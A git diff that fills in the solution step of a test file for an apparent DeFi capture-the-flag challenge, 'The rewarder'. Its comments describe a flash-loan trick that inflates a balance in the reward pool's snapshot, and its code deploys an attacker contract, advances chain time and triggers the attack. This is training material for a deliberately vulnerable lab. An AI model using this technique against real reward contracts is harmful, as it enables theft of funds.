@@ -69,7 +69,12 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // TheRewarderPool makes a snapshot on deposit
+        // We can deposit some money from the flash lender, show up in the snapshot, withdraw the money and return it
+        // This will make us look veeery rich in the snapshot for free 
+        attacker = await (await ethers.getContractFactory('TheRewarderAttacker', player)).deploy(rewarderPool.address, flashLoanPool.address);
+        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]);
+        await attacker.attack();
     });
 
     after(async function () {
